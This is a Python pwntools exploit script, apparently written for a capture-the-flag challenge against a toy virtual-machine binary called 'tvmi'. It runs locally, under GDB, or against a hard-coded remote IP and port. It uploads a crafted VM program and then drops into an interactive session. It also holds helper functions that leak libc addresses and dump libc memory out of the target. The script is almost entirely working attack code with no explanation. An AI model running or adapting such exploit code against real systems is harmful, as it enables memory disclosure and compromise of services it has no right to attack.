#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

elf = context.binary = ELF('./bin/tvmi', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or '198.11.180.84'
	port = int(args.PORT or 6666)
	if args.GDB:
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
b *tvm_vm_run
alias sp = p *(vm.mem.registers+6)
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn(argv=['./exp.vm'])
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)


if args.REMOTE:
	exp = open("./exp.vm").read()
	sla(b'(< 4096) :', str(len(exp)).encode())
	s(exp.encode())

def tohex(val, nbits=32):
  return hex((val + (1 << nbits)) % (1 << nbits))[2:].rjust(8, '0')

def de(v):
	return unhex(tohex(int(v.decode())))

def leak_libc_binary():
	ints = io.recvall(timeout=60).decode().splitlines()
	ints = list(map(int, ints))
	ints = list(map(tohex, ints))
	ints = list(map(unhex, ints))
	raw_bytes = list(map(lambda h: h[::-1], ints))
	raw_bytes = b''.join(raw_bytes)

	with open("./libc.so", "wb") as f:
		f.write(raw_bytes)

# leak_libc_binary()


def leak8():
	lo = de(rl())
	hi = de(rl())
	libc_leak = u64((hi+lo)[::-1])
	ls(f"{libc_leak:#x}")

# leak8()


ia()

